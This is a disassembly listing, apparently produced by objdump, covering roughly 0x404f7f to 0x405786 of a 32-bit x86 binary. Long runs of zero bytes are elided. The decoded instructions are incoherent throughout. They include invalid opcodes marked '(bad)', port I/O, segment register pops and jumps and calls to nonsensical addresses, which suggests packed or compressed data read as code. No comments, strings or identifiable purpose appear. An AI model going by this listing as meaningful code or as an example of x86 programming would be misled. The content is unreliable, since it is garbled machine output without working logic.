  404f7f:	f7 49 a4 a1 2d f6 32 	testl  $0x32f62da1,-0x5c(%ecx)
  404f86:	04 ff                	add    $0xff,%al
  404f88:	f3 a8 e5             	repz test $0xe5,%al
  404f8b:	ff 31                	push   (%ecx)
  404f8d:	8d 49 e2             	lea    -0x1e(%ecx),%ecx
  404f90:	3e 84 08             	test   %cl,%ds:(%eax)
  404f93:	c0 aa 8d 88 8d 26 5c 	shrb   $0x5c,0x268d888d(%edx)
  404f9a:	96                   	xchg   %eax,%esi
  404f9b:	d5 11                	aad    $0x11
  404f9d:	e7 99                	out    %eax,$0x99
  404f9f:	89 4b 48             	mov    %ecx,0x48(%ebx)
  404fa2:	21 43 3e             	and    %eax,0x3e(%ebx)
  404fa5:	6e                   	outsb  %ds:(%esi),(%dx)
  404fa6:	45                   	inc    %ebp
  404fa7:	d5 b3                	aad    $0xb3
  404fa9:	7f 96                	jg     0x404f41
  404fab:	d5 f1                	aad    $0xf1
  404fad:	83 bb e1 3e 5b 64 7f 	cmpl   $0x7f,0x645b3ee1(%ebx)
  404fb4:	da 8a 6e d5 6e 7a    	fimull 0x7a6ed56e(%edx)
  404fba:	9c                   	pushf
  404fbb:	e8 e1 7a 5e ec       	call   0xec9ecaa1
  404fc0:	04 7e                	add    $0x7e,%al
  404fc2:	e9 03 bb 9b d1       	jmp    0xd1dc0aca
  404fc7:	48                   	dec    %eax
  404fc8:	b9 b0 55 e5 b1       	mov    $0xb1e555b0,%ecx
  404fcd:	7a 51                	jp     0x405020
  404fcf:	09 99 7a 36 8b bb    	or     %ebx,-0x4474c986(%ecx)
  404fd5:	83 3e d5             	cmpl   $0xffffffd5,(%esi)
  404fd8:	99                   	cltd
  404fd9:	7a 5c                	jp     0x405037
  404fdb:	ec                   	in     (%dx),%al
	...
  405004:	00 00                	add    %al,(%eax)
  405006:	a1 7a 1e ec 53       	mov    0x53ec1e7a,%eax
  40500b:	72 16                	jb     0x405023
  40500d:	d5 dd                	aad    $0xdd
  40500f:	2c a1                	sub    $0xa1,%al
  405011:	42                   	inc    %edx
  405012:	3e 7a 3c             	jp,pt  0x405051
  405015:	e0 61                	loopne 0x405078
  405017:	7a fe                	jp     0x405017
  405019:	eb 54                	jmp    0x40506f
  40501b:	7c e9                	jl     0x405006
  40501d:	03 35 9b 75 f8 c4    	add    0xc4f8759b,%esi
  405023:	e8 d1 e4 51 7a       	call   0x7a9234f9
  405028:	72 d3                	jb     0x404ffd
  40502a:	b5 38                	mov    $0x38,%ch
  40502c:	18 4c ff 5a          	sbb    %cl,0x5a(%edi,%edi,8)
  405030:	da 9f 39 b0 cd e4    	ficompl -0x1b324fc7(%edi)
  405036:	31 7a d1             	xor    %edi,-0x2f(%edx)
  405039:	b2 1f                	mov    $0x1f,%dl
  40503b:	5b                   	pop    %ebx
  40503c:	00 e9                	add    %ch,%cl
  40503e:	0a b0 f0 be f2 79    	or     0x79f2bef0(%eax),%dh
  405044:	e8 0a 18 7a ff       	call   0xffba6853
  405049:	9e                   	sahf
  40504a:	b8 86 ef 96 ea       	mov    $0xea96ef86,%eax
  40504f:	82 58 7f 12          	sbbb   $0x12,0x7f(%eax)
  405053:	7a 5f                	jp     0x4050b4
  405055:	27                   	daa
  405056:	05 9e 55 72 e1       	add    $0xe172559e,%eax
  40505b:	04 08                	add    $0x8,%al
  40505d:	81 df 70 ff 6e c6    	sbb    $0xc66eff70,%edi
  405063:	8a ff                	mov    %bh,%bh
  405065:	1c c7                	sbb    $0xc7,%al
  405067:	22 41 e9             	and    -0x17(%ecx),%al
	...
  405092:	00 00                	add    %al,(%eax)
  405094:	c2 5c ff             	ret    $0xff5c
  405097:	dc 35 ea 42 e5 c4    	fdivl  0xc4e542ea
  40509d:	4f                   	dec    %edi
  40509e:	8b b1 fc 5a c9 2b    	mov    0x2bc95afc(%ecx),%esi
  4050a4:	a9 79 54 62 99       	test   $0x99625479,%eax
  4050a9:	dd c4                	ffree  %st(4)
  4050ab:	31 6a a2             	xor    %ebp,-0x5e(%edx)
  4050ae:	45                   	inc    %ebp
  4050af:	21 3d 5b 00 e9 be    	and    %edi,0xbee9005b
  4050b5:	f7 07 e9 f1 4c ff    	testl  $0xff4cf1e9,(%edi)
  4050bb:	94                   	xchg   %eax,%esp
  4050bc:	41                   	inc    %ecx
  4050bd:	7a 75                	jp     0x405134
  4050bf:	f1                   	int1
  4050c0:	e7 5a                	out    %eax,$0x5a
  4050c2:	e8 fc 87 79 ff       	call   0xffb9d8c3
  4050c7:	60                   	pusha
  4050c8:	20 77 eb             	and    %dh,-0x15(%edi)
  4050cb:	e6 9a                	out    %al,$0x9a
  4050cd:	1f                   	pop    %ds
  4050ce:	fc                   	cld
  4050cf:	e9 3d 5b 00 72       	jmp    0x7240ac11
  4050d4:	2f                   	das
  4050d5:	e6 48                	out    %al,$0x48
  4050d7:	28 3a                	sub    %bh,(%edx)
  4050d9:	86 13                	xchg   %dl,(%ebx)
  4050db:	62 87 77 3b 00 60    	bound  %eax,0x60003b77(%edi)
  4050e1:	63 75 09             	arpl   %si,0x9(%ebp)
  4050e4:	e0 22                	loopne 0x405108
  4050e6:	f8                   	clc
  4050e7:	01 17                	add    %edx,(%edi)
  4050e9:	5d                   	pop    %ebp
  4050ea:	00 eb                	add    %ch,%bl
  4050ec:	21 fa                	and    %edi,%edx
  4050ee:	3e 0b d8             	ds or  %eax,%ebx
  4050f1:	12 e9                	adc    %cl,%ch
  4050f3:	83 2a a7             	subl   $0xffffffa7,(%edx)
  4050f6:	00 75 00             	add    %dh,0x0(%ebp)
	...
  405121:	00 1f                	add    %bl,(%edi)
  405123:	8e 75 fc             	mov    -0x4(%ebp),%?
  405126:	bf e1 ff ff b8       	mov    $0xb8ffffe1,%edi
  40512b:	f8                   	clc
  40512c:	44                   	inc    %esp
  40512d:	f8                   	clc
  40512e:	48                   	dec    %eax
  40512f:	b6 c2                	mov    $0xc2,%dh
  405131:	08 d7                	or     %dl,%bh
  405133:	35 8b 3d 5c 37       	xor    $0x375c3d8b,%eax
  405138:	41                   	inc    %ecx
  405139:	00 6c 77 56          	add    %ch,0x56(%edi,%esi,2)
  40513d:	8b 28                	mov    (%eax),%ebp
  40513f:	97                   	xchg   %eax,%edi
  405140:	3e f6 68 8c          	imulb  %ds:-0x74(%eax)
  405144:	0b ff                	or     %edi,%edi
  405146:	92                   	xchg   %eax,%edx
  405147:	90                   	nop
  405148:	c7 05 2c 37 41 00 97 	movl   $0x5c97,0x41372c
  40514f:	5c 00 00 
  405152:	c8 a1 55 8b          	enter  $0x55a1,$0x8b
  405156:	5b                   	pop    %ebx
  405157:	34 56                	xor    $0x56,%al
  405159:	6a a7                	push   $0xffffffa7
  40515b:	8d 75 08             	lea    0x8(%ebp),%esi
  40515e:	2f                   	das
  40515f:	cd f9                	int    $0xf9
  405161:	ff 28                	ljmp   *(%eax)
  405163:	f8                   	clc
  405164:	f7 ff                	idiv   %edi
  405166:	d2 74 e7 eb          	shlb   %cl,-0x15(%edi,%eiz,8)
  40516a:	47                   	inc    %edi
  40516b:	5f                   	pop    %edi
  40516c:	00 83 3f 5e 76 0f    	add    %al,0xf765e3f(%ebx)
  405172:	c0 dc 3f             	rcr    $0x3f,%ah
  405175:	22 d2                	and    %dl,%dl
  405177:	73 fb                	jae    0x405174
  405179:	8d                   	(bad)
  40517a:	f0 5d                	lock pop %ebp
  40517c:	8b c8                	mov    %eax,%ecx
  40517e:	64 c0 5f 68 3e       	rcrb   $0x3e,%fs:0x68(%edi)
  405183:	01 3b                	add    %edi,(%ebx)
  405185:	41                   	inc    %ecx
	...
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	3e 31 dc             	ds xor %ebx,%esp
  4051b3:	6a 1c                	push   $0x1c
  4051b5:	82 03 0b             	addb   $0xb,(%ebx)
  4051b8:	fe                   	(bad)
  4051b9:	2d 08 c6 7e 86       	sub    $0x867ec608,%eax
  4051be:	03 6a 7a             	add    0x7a(%edx),%ebp
  4051c1:	1c 04                	sbb    $0x4,%al
  4051c3:	57                   	push   %edi
  4051c4:	26 20 e6             	es and %ah,%dh
  4051c7:	00 3e                	add    %bh,(%esi)
  4051c9:	6d                   	insl   (%dx),%es:(%edi)
  4051ca:	c3                   	ret
  4051cb:	74 3b                	je     0x405208
  4051cd:	c8 03 00 e5          	enter  $0x3,$0xe5
  4051d1:	84 c9                	test   %cl,%cl
  4051d3:	07                   	pop    %es
  4051d4:	3e 59                	ds pop %ecx
  4051d6:	dc a8 de 81 03 83    	fsubrl -0x7cfc7e22(%eax)
  4051dc:	e6 84                	out    %al,$0x84
  4051de:	5a                   	pop    %edx
  4051df:	03 00                	add    (%eax),%eax
  4051e1:	81 03 8b f9 9f 32    	addl   $0x329ff98b,(%ebx)
  4051e7:	c9                   	leave
  4051e8:	fc                   	cld
  4051e9:	7d 03                	jge    0x4051ee
  4051eb:	55                   	push   %ebp
  4051ec:	b5 1d                	mov    $0x1d,%ch
  4051ee:	86 c4                	xchg   %al,%ah
  4051f0:	ba fc 47 0c 3b       	mov    $0x3b0c47fc,%edx
  4051f5:	82 f3 ff             	xor    $0xff,%bl
  4051f8:	a9 d1 db c5 ab       	test   $0xabc5dbd1,%eax
  4051fd:	30 d2                	xor    %dl,%dl
  4051ff:	89 03                	mov    %eax,(%ebx)
  405201:	46                   	inc    %esi
  405202:	d2 75 42             	shlb   %cl,0x42(%ebp)
  405205:	41                   	inc    %ecx
  405206:	58                   	pop    %eax
  405207:	fc                   	cld
  405208:	89 ce                	mov    %ecx,%esi
  40520a:	fb                   	sti
  40520b:	e7 95                	out    %eax,$0x95
  40520d:	56                   	push   %esi
  40520e:	d2 ff                	sar    %cl,%bh
  405210:	79 ce                	jns    0x4051e0
  405212:	f3 fe 00             	repz incb (%eax)
	...
  40523d:	00 eb                	add    %ch,%bl
  40523f:	6d                   	insl   (%dx),%es:(%edi)
  405240:	d2 75 6a             	shlb   %cl,0x6a(%ebp)
  405243:	49                   	dec    %ecx
  405244:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405245:	09 3e                	or     %edi,(%esi)
  405247:	82 d2 75             	adc    $0x75,%dl
  40524a:	5a                   	pop    %edx
  40524b:	59                   	pop    %ecx
  40524c:	8a f5                	mov    %ch,%dh
  40524e:	51                   	push   %ecx
  40524f:	5a                   	pop    %edx
  405250:	e6 bb                	out    %al,$0xbb
  405252:	7c 66                	jl     0x4052ba
  405254:	e9 36 b5 86 3f       	jmp    0x3fc7078f
  405259:	35 91 76 54 fc       	xor    $0xfc547691,%eax
  40525e:	19 d5                	sbb    %edx,%ebp
  405260:	c9                   	leave
  405261:	04 3e                	add    $0x3e,%al
  405263:	cb                   	lret
  405264:	f2 c3                	bnd ret
  405266:	ab                   	stos   %eax,%es:(%edi)
  405267:	5e                   	pop    %esi
  405268:	16                   	push   %ss
  405269:	2d 78 a4 ab fc       	sub    $0xfcaba478,%eax
  40526e:	11 e2                	adc    %esp,%edx
  405270:	24 fc                	and    $0xfc,%al
  405272:	b9 e2 c1 74 b5       	mov    $0xb574c1e2,%ecx
  405277:	f0 e4 1c             	lock in $0x1c,%al
  40527a:	fe                   	(bad)
  40527b:	77 50                	ja     0x4052cd
  40527d:	d1 f1                	shl    %ecx
  40527f:	76 86                	jbe    0x405207
  405281:	74 ec                	je     0x40526f
  405283:	c5 59 84             	lds    -0x7c(%ecx),%ebx
  405286:	21 5b fd             	and    %ebx,-0x3(%ebx)
  405289:	ea 70 0a 81 53 de 5b 	ljmp   $0x5bde,$0x53810a70
  405290:	e9 fc 89 f0 e5       	jmp    0xe630dc91
  405295:	30 65 15             	xor    %ah,0x15(%ebp)
  405298:	20 c6                	and    %al,%dh
  40529a:	46                   	inc    %esi
  40529b:	5b                   	pop    %ebx
  40529c:	60                   	pusha
  40529d:	0a bd 9d ed dc 00    	or     0xdced9d(%ebp),%bh
	...
  4052cb:	00 90 b3 e8 03 3e    	add    %dl,0x3e03e8b3(%eax)
  4052d1:	5b                   	pop    %ebx
  4052d2:	96                   	xchg   %eax,%esi
  4052d3:	2c f8                	sub    $0xf8,%al
  4052d5:	a3 2b fc 91 fe       	mov    %eax,0xfe91fc2b
  4052da:	e1 3c                	loope  0x405318
  4052dc:	ff 5a 91             	lcall  *-0x6f(%edx)
  4052df:	eb f6                	jmp    0x4052d7
  4052e1:	1b e9                	sbb    %ecx,%ebp
  4052e3:	db d1                	fcmovnbe %st(1),%st
  4052e5:	76 0e                	jbe    0x4052f5
  4052e7:	d1 e6                	shl    %esi
  4052e9:	d9 b2 42 3e 03 90    	fnstenv -0x6ffcc1be(%edx)
  4052ef:	3d ff 5a 00 01       	cmp    $0x1005aff,%eax
  4052f4:	da 75 ff             	fidivl -0x1(%ebp)
  4052f7:	ee                   	out    %al,(%dx)
  4052f8:	f5                   	cmc
  4052f9:	35 4b 28 42 03       	xor    $0x342284b,%eax
  4052fe:	32 30                	xor    (%eax),%dh
  405300:	fd                   	std
  405301:	5a                   	pop    %edx
  405302:	e8 50 0f 76 ff       	call   0xffb66257
  405307:	41                   	inc    %ecx
  405308:	c1 21 41             	shll   $0x41,(%ecx)
  40530b:	e9 85 d6 4b 28       	jmp    0x288c2995
  405310:	3a 83 6a b6 ee 75    	cmp    0x75eeb66a(%ebx),%al
  405316:	68 fa 52 1c 00       	push   $0x1c52fa
  40531b:	11 e9                	adc    %ebp,%ecx
  40531d:	22 41 e9             	and    -0x17(%ecx),%al
  405320:	e5 11                	in     $0x11,%eax
  405322:	ff 96 0e 03 2b 22    	call   *0x222b030e(%esi)
  405328:	7d 5b                	jge    0x405385
  40532a:	68 54 25 1c 00       	push   $0x1c2554
  40532f:	91                   	xchg   %eax,%ecx
	...
  405358:	00 00                	add    %al,(%eax)
  40535a:	21 76 ff             	and    %esi,-0x1(%esi)
  40535d:	76 75                	jbe    0x4053d4
  40535f:	ce                   	into
  405360:	4b                   	dec    %ebx
  405361:	28 3a                	sub    %bh,(%edx)
  405363:	03 eb                	add    %ebx,%ebp
  405365:	b3 7c                	mov    $0x7c,%bl
  405367:	5b                   	pop    %ebx
  405368:	e8 1c ef 75 ff       	call   0xffb64289
  40536d:	c1 2a 22             	shrl   $0x22,(%edx)
  405370:	41                   	inc    %ecx
  405371:	e9 15 64 4b a8       	jmp    0xa88bb78b
  405376:	3d 83 2e 3e 8e       	cmp    $0x8e3e2e83,%eax
  40537b:	75 c3                	jne    0x405340
  40537d:	9c                   	pushf
  40537e:	1a 87 8b a4 95 60    	sbb    0x6095a48b(%edi),%al
  405384:	c0 9d 40 db 38 e9 e8 	rcrb   $0xe8,-0x16c724c0(%ebp)
  40538b:	63 b8 e9 3d 5b 00    	arpl   %di,0x5b3de9(%eax)
  405391:	20 7b 5e             	and    %bh,0x5e(%ebx)
  405394:	00 00                	add    %al,(%eax)
  405396:	8c af eb 17 d7 61    	mov    %gs,0x61d717eb(%edi)
  40539c:	5c                   	pop    %esp
  40539d:	74 6a                	je     0x405409
  40539f:	d9 38                	fnstcw (%eax)
  4053a1:	2f                   	das
  4053a2:	ca 62 ba             	lret   $0xba62
  4053a5:	01 57 59             	add    %edx,0x59(%edi)
  4053a8:	00 eb                	add    %ch,%bl
  4053aa:	5a                   	pop    %edx
  4053ab:	e3 00                	jecxz  0x4053ad
  4053ad:	00 27                	add    %ah,(%edi)
  4053af:	59                   	pop    %ecx
  4053b0:	40                   	inc    %eax
  4053b1:	80 4f 5f 75          	orb    $0x75,0x5f(%edi)
  4053b5:	e4 ac                	in     $0xac,%al
  4053b7:	99                   	cltd
  4053b8:	c9                   	leave
  4053b9:	c2 1b 59             	ret    $0x591b
  4053bc:	55                   	push   %ebp
  4053bd:	8b 00                	mov    (%eax),%eax
	...
  4053e7:	00 03                	add    %al,(%ebx)
  4053e9:	2d 56 53 9c 22       	sub    $0x229c5356,%eax
  4053ee:	0c 05                	or     $0x5,%al
  4053f0:	17                   	pop    %ss
  4053f1:	5d                   	pop    %ebp
  4053f2:	00 00                	add    %al,(%eax)
  4053f4:	c6                   	(bad)
  4053f5:	7f 50                	jg     0x405447
  4053f7:	e8 54 93 ff ff       	call   0x3fe750
  4053fc:	5c                   	pop    %esp
  4053fd:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4053fe:	8b d8                	mov    %eax,%ebx
  405400:	6c                   	insb   (%dx),%es:(%edi)
  405401:	12 08                	adc    (%eax),%cl
  405403:	8b 12                	mov    (%edx),%edx
  405405:	5b                   	pop    %ebx
  405406:	eb 02                	jmp    0x40540a
  405408:	8b 36                	mov    (%esi),%esi
  40540a:	0b c9                	or     %ecx,%ecx
  40540c:	cb                   	lret
  40540d:	63 80 3e cd 13 f5    	arpl   %ax,-0xaec32c2(%eax)
  405413:	0b 0e                	or     (%esi),%ecx
  405415:	13 02                	adc    (%edx),%eax
  405417:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405418:	de 51 c0             	ficoms -0x40(%ecx)
  40541b:	aa                   	stos   %al,%es:(%edi)
  40541c:	1a b6 75 e6 2c 98    	sbb    -0x67d3198b(%esi),%dh
  405422:	5b                   	pop    %ebx
  405423:	5e                   	pop    %esi
  405424:	c0 b7 c2 08 a7 29 56 	shlb   $0x56,0x29a708c2(%edi)
  40542b:	b9 9b 58 00 00       	mov    $0x589b,%ecx
  405430:	07                   	pop    %es
  405431:	48                   	dec    %eax
  405432:	d2 90 64 c1 90 ac    	rclb   %cl,-0x536f3e9c(%eax)
  405438:	3e f2 fe             	ds repnz (bad)
  40543b:	b5 7e                	mov    $0x7e,%ch
  40543d:	f2 0f 2b             	(bad)
  405440:	ce                   	into
  405441:	f7 04 90 bd 40 0e 90 	testl  $0x900e40bd,(%eax,%edx,4)
  405448:	fd                   	std
  405449:	ad                   	lods   %ds:(%esi),%eax
  40544a:	1e                   	push   %ds
  40544b:	90                   	nop
	...
  405474:	00 00                	add    %al,(%eax)
  405476:	cb                   	lret
  405477:	7b 73                	jnp    0x4054ec
  405479:	83 7c 3d 74 43       	cmpl   $0x43,0x74(%ebp,%edi,1)
  40547e:	02 52 74             	add    0x74(%edx),%dl
  405481:	7c 44                	jl     0x4054c7
  405483:	4e                   	dec    %esi
  405484:	0d 90 b1 7f 07       	or     $0x77fb190,%eax
  405489:	04 3d                	add    $0x3d,%al
  40548b:	d2 42 3c             	rolb   %cl,0x3c(%edx)
  40548e:	7f 12                	jg     0x4054a2
  405490:	4f                   	dec    %edi
  405491:	0b 5a 48             	or     0x48(%edx),%ebx
  405494:	74 7f                	je     0x405515
  405496:	38 76 44             	cmp    %dh,0x44(%esi)
  405499:	90                   	nop
  40549a:	3d b2 42 3c 9f       	cmp    $0x9f3c42b2,%eax
  40549f:	f2 4e                	repnz dec %esi
  4054a1:	0a 3a                	or     (%edx),%bh
  4054a3:	48                   	dec    %eax
  4054a4:	74 7f                	je     0x405525
  4054a6:	3b b6 46 03 0e 41    	cmp    0x410e0346(%esi),%esi
  4054ac:	c5 c2 38             	(bad)
  4054af:	e0 94                	loopne 0x405445
  4054b1:	c1 04 84 7a          	roll   $0x7a,(%esp,%eax,4)
  4054b5:	c2 41 ba             	ret    $0xba41
  4054b8:	c4                   	(bad)
  4054b9:	e8 36 a9 73 8b       	call   0x8bb3fdf4
  4054be:	f5                   	cmc
  4054bf:	f1                   	int1
  4054c0:	2c 5b                	sub    $0x5b,%al
  4054c2:	7d b6                	jge    0x40547a
  4054c4:	7a ec                	jp     0x4054b2
  4054c6:	0d ad 35 fc b5       	or     $0xb5fc35ad,%eax
  4054cb:	b6 fb                	mov    $0xfb,%dh
  4054cd:	8f                   	(bad)
  4054ce:	b5 b6                	mov    $0xb6,%ch
  4054d0:	f3 8f c5             	repz pop %ebp
  4054d3:	be ff 8f 4d 49       	mov    $0x494d8fff,%esi
  4054d8:	e2 22                	loop   0x4054fc
	...
  405502:	00 00                	add    %al,(%eax)
  405504:	ae                   	scas   %es:(%edi),%al
  405505:	5a                   	pop    %edx
  405506:	b8 73 96 e8 1d       	mov    $0x1de89673,%eax
  40550b:	ce                   	into
  40550c:	79 ca                	jns    0x4054d8
  40550e:	6c                   	insb   (%dx),%es:(%edi)
  40550f:	bc f0 62 43 c4       	mov    $0xc44362f0,%esp
  405514:	56                   	push   %esi
  405515:	62 59 42             	bound  %ebx,0x42(%ecx)
  405518:	5c                   	pop    %esp
  405519:	72 59                	jb     0x405574
  40551b:	2c ae                	sub    $0xae,%al
  40551d:	d7                   	xlat   %ds:(%ebx)
  40551e:	2f                   	das
  40551f:	07                   	pop    %es
  405520:	ae                   	scas   %es:(%edi),%al
  405521:	d7                   	xlat   %ds:(%ebx)
  405522:	00 07                	add    %al,(%edi)
  405524:	ae                   	scas   %es:(%edi),%al
  405525:	f3 c6                	repz (bad)
  405527:	74 b5                	je     0x4054de
  405529:	97                   	xchg   %eax,%edi
  40552a:	79 2e                	jns    0x40555a
  40552c:	99                   	cltd
  40552d:	16                   	push   %ss
  40552e:	a0 c2 42 5b 34       	mov    0x345b42c2,%al
  405533:	79 1a                	jns    0x40554f
  405535:	dd ad e0 20 73 be    	(bad)  -0x418cdf20(%ebp)
  40553b:	31 65 96             	xor    %esp,-0x6a(%ebp)
  40553e:	64 47                	fs inc %edi
  405540:	12 0c 41             	adc    (%ecx,%eax,2),%cl
  405543:	78 76                	js     0x4055bb
  405545:	1c e9                	sbb    $0xe9,%al
  405547:	cc                   	int3
  405548:	4b                   	dec    %ebx
  405549:	c4 31                	les    (%ecx),%esi
  40554b:	43                   	inc    %ebx
  40554c:	3e 83 73 ad 3e       	xorl   $0x3e,%ds:-0x53(%ebx)
  405551:	5b                   	pop    %ebx
  405552:	e2 c3                	loop   0x405517
  405554:	73 3d                	jae    0x405593
  405556:	86 57 4e             	xchg   %dl,0x4e(%edi)
  405559:	72 f4                	jb     0x40554f
  40555b:	ff 67 5e             	jmp    *0x5e(%edi)
  40555e:	03 04 d1             	add    (%ecx,%edx,8),%eax
  405561:	e8 e0 cc 53 6f       	call   0x6f942246
  405566:	51                   	push   %ecx
  405567:	85 00                	test   %eax,(%eax)
	...
  405591:	00 e1                	add    %ah,%cl
  405593:	5b                   	pop    %ebx
  405594:	e9 f8 f9 e8 e7       	jmp    0xe8294f91
  405599:	40                   	inc    %eax
  40559a:	b1 e8                	mov    $0xe8,%cl
  40559c:	4c                   	dec    %esp
  40559d:	dc 1c 92             	fcompl (%edx,%edx,4)
  4055a0:	e9 03 35 96 ee       	jmp    0xeed68aa8
  4055a5:	86 83 5b 00 e9 3d    	xchg   %al,0x3de9005b(%ebx)
  4055ab:	e0 85                	loopne 0x405532
  4055ad:	3a 78 72             	cmp    0x72(%eax),%bh
  4055b0:	ff                   	(bad)
  4055b1:	b9 e5 56 01 e9       	mov    $0xe90156e5,%ecx
  4055b6:	3d 83 4d 37 3a       	cmp    $0x3a374d83,%eax
  4055bb:	5b                   	pop    %ebx
  4055bc:	0b 29                	or     (%ecx),%ebp
  4055be:	6b de ac             	imul   $0xffffffac,%esi,%ebx
  4055c1:	e9 3d 5b 3d e5       	jmp    0xe57db103
  4055c6:	3c 5b                	cmp    $0x5b,%al
  4055c8:	00 e6                	add    %ah,%dh
  4055ca:	ba bc 00 e9 3d       	mov    $0x3de900bc,%edx
  4055cf:	05 00 74 b8 6e       	add    $0x6eb87400,%eax
  4055d4:	fe                   	(bad)
  4055d5:	de 0a                	fimuls (%edx)
  4055d7:	0b e8                	or     %eax,%ebp
  4055d9:	1b e0                	sbb    %eax,%esp
  4055db:	5a                   	pop    %edx
  4055dc:	00 5c c0 6d          	add    %bl,0x6d(%eax,%eax,8)
  4055e0:	fe c6                	inc    %dh
  4055e2:	f2 0a e8             	repnz or %al,%ch
  4055e5:	29 08                	sub    %ecx,(%eax)
  4055e7:	72 ff                	jb     0x4055e8
  4055e9:	e2 fd                	loop   0x4055e8
  4055eb:	e7 1b                	out    %eax,$0x1b
  4055ed:	41                   	inc    %ecx
  4055ee:	c1 22 41             	shll   $0x41,(%edx)
  4055f1:	e9 80 d8 f3 9f       	jmp    0xa0342e76
	...
  40561e:	00 00                	add    %al,(%eax)
  405620:	0a 72 50             	or     0x50(%edx),%dh
  405623:	81 87 69 ff 8e fa e7 	addl   $0x21907e7,-0x5710097(%edi)
  40562a:	07 19 02 
  40562d:	98                   	cwtl
  40562e:	f6 7e 0a             	idivb  0xa(%esi)
  405631:	86 0f                	xchg   %cl,(%edi)
  405633:	76 68                	jbe    0x40569d
  405635:	63 8d 64 ee 70 ff    	arpl   %cx,-0x8f119c(%ebp)
  40563b:	66 0d 83 60          	or     $0x6083,%ax
  40563f:	57                   	push   %edi
  405640:	8a 71 89             	mov    -0x77(%ecx),%dh
  405643:	6c                   	insb   (%dx),%es:(%edi)
  405644:	91                   	xchg   %eax,%ecx
  405645:	70 ff                	jo     0x405646
  405647:	4e                   	dec    %esi
  405648:	07                   	pop    %es
  405649:	5b                   	pop    %ebx
  40564a:	6a 00                	push   $0x0
  40564c:	97                   	xchg   %eax,%edi
  40564d:	13 02                	adc    (%edx),%eax
  40564f:	6a a7                	push   $0xffffffa7
  405651:	13 03                	adc    (%ebx),%eax
  405653:	68 a7 5d 00 c0       	push   $0xc0005da7
  405658:	58                   	pop    %eax
  405659:	c9                   	leave
  40565a:	ec                   	in     (%dx),%al
  40565b:	fe                   	(bad)
  40565c:	58                   	pop    %eax
  40565d:	9f                   	lahf
  40565e:	e8 5f 3a 5e 00       	call   0x9e90c2
  405663:	89 a2 a5 40 74 6f    	mov    %esp,0x6f7440a5(%edx)
  405669:	9e                   	sahf
  40566a:	75 10                	jne    0x40567c
  40566c:	38 09                	cmp    %cl,(%ecx)
  40566e:	0c ff                	or     $0xff,%al
  405670:	d2 a5 e8 f7 3a 9f    	shlb   %cl,-0x60c50818(%ebp)
  405676:	ff 8b 2f 9f 75 f8    	decl   -0x78a60d1(%ebx)
  40567c:	6f                   	outsl  %ds:(%esi),(%dx)
  40567d:	33 dd                	xor    %ebp,%ebx
  40567f:	00 27                	add    %ah,(%edi)
  405681:	72 da                	jb     0x40565d
  405683:	75 00                	jne    0x405685
	...
  4056ad:	00 1c a6             	add    %bl,(%esi,%eiz,4)
  4056b0:	b5 ec                	mov    $0xec,%ch
  4056b2:	f9                   	stc
  4056b3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056b4:	ff                   	(bad)
  4056b5:	e8 a7 c2 00 00       	call   0x411961
  4056ba:	d8 ca                	fmul   %st(2),%st
  4056bc:	ec                   	in     (%dx),%al
  4056bd:	fe c8                	dec    %al
  4056bf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056c0:	e8 69 c5 a4 ff       	call   0xffe51c2e
  4056c5:	8b d4                	mov    %esp,%edx
  4056c7:	40                   	inc    %eax
  4056c8:	c9                   	leave
  4056c9:	c2 eb 5c             	ret    $0x5ceb
  4056cc:	55                   	push   %ebp
  4056cd:	8b bb d6 c4 ec b9    	mov    -0x46133b2a(%ebx),%edi
  4056d3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056d4:	ff 53 b8             	call   *-0x48(%ebx)
  4056d7:	0a 0c ff             	or     (%edi,%edi,8),%cl
  4056da:	d2 74 67 94          	shlb   %cl,-0x6c(%edi,%eiz,2)
  4056de:	1f                   	pop    %ds
  4056df:	16                   	push   %ss
  4056e0:	00 ff                	add    %bh,%bh
  4056e2:	92                   	xchg   %eax,%edx
  4056e3:	cf                   	iret
  4056e4:	48                   	dec    %eax
  4056e5:	41                   	inc    %ecx
  4056e6:	d7                   	xlat   %ds:(%ebx)
  4056e7:	94                   	xchg   %eax,%esp
  4056e8:	5a                   	pop    %edx
  4056e9:	f5                   	cmc
  4056ea:	18 a4 0b c0 3e 79 80 	sbb    %ah,-0x7f86c140(%ebx,%ecx,1)
  4056f1:	da 3e                	fidivrl (%esi)
  4056f3:	82 03 2b             	addb   $0x2b,(%ebx)
  4056f6:	85 e7                	test   %esp,%edi
  4056f8:	80 ef 98             	sub    $0x98,%bh
  4056fb:	31 cb                	xor    %ecx,%ebx
  4056fd:	50                   	push   %eax
  4056fe:	26 7e 04             	es jle 0x405705
  405701:	00 3e                	add    %bh,(%esi)
  405703:	1a 33                	sbb    (%ebx),%dh
  405705:	dd 3e                	fnstsw (%esi)
  405707:	82 fe bf             	cmp    $0xbf,%dh
  40570a:	49                   	dec    %ecx
  40570b:	f6 88 00 3e 82 08 04 	testb  $0x4,0x8823e00(%eax)
	...
  40573a:	00 00                	add    %al,(%eax)
  40573c:	3f                   	aas
  40573d:	82 03 0f             	addb   $0xf,(%ebx)
  405740:	b9 34 04 00 3e       	mov    $0x3e000434,%ecx
  405745:	ff 40 fc             	incl   -0x4(%eax)
  405748:	ee                   	out    %al,(%dx)
  405749:	59                   	pop    %ecx
  40574a:	5f                   	pop    %edi
  40574b:	e9 49 81 78 85       	jmp    0x85b8d899
  405750:	51                   	push   %ecx
  405751:	78 ca                	js     0x40571d
  405753:	ff 8e 8a 3a fd 31    	decl   0x31fd3a8a(%esi)
  405759:	89 fe                	mov    %edi,%esi
  40575b:	bf b3 7e 5b 85       	mov    $0x855b7eb3,%edi
  405760:	76 43                	jbe    0x4057a5
  405762:	04 8d                	add    $0x8d,%al
  405764:	c3                   	ret
  405765:	a0 c9 ff 11 52       	mov    0x5211ffc9,%al
  40576a:	dc 89 13 c1 ca ff    	fmull  -0x353eed(%ecx)
  405770:	8b 6a 33             	mov    0x33(%edx),%ebp
  405773:	e8 12 c7 ca ff       	call   0xb1e8a
  405778:	e5 78                	in     $0x78,%eax
  40577a:	ca 75 36             	lret   $0x3675
  40577d:	0f 80 ef e0 d8 ca    	jo     0xcb193872
  405783:	50                   	push   %eax
  405784:	e6 60                	out    %al,$0x60
  405786:	d1 ff                	sar    %edi
